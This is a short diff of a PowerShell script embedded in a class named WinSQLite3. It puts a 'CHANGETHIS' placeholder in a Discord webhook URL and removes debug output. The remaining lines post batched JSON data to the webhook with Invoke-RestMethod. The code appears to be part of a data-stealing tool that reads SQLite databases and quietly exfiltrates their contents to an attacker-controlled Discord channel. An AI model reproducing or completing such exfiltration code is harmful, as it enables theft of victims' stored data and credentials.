@@ -134,11 +134,10 @@ public class WinSQLite3
                                 $payload = @{ content = $content } | ConvertTo-Json -Depth 10
                 
                                 # Define webhook URL
-                                $hookUrl = "https://discord.com/api/webhooks/XXXXXXXXXX"
+                                $hookUrl = "https://discord.com/api/webhooks/CHANGETHIS"
                                 if ($payload.Length -gt 1900) {
                                     $payload = @{ content = "Data too long, unable to send." } | ConvertTo-Json -Depth 10
                                 } 
-                                Write-Host $payload
                                 Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
                                 $apiCallCount++
                                 # Clear the hashtable and reset counter
@@ -156,7 +155,6 @@ public class WinSQLite3
                         if ($prepare.Count -gt 0) {
                             $content = ConvertTo-Json -InputObject $prepare -Depth 10
                             $payload = @{ content = $content } | ConvertTo-Json -Depth 10
-                            Write-Host $payload
                             Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
                         }
                     }
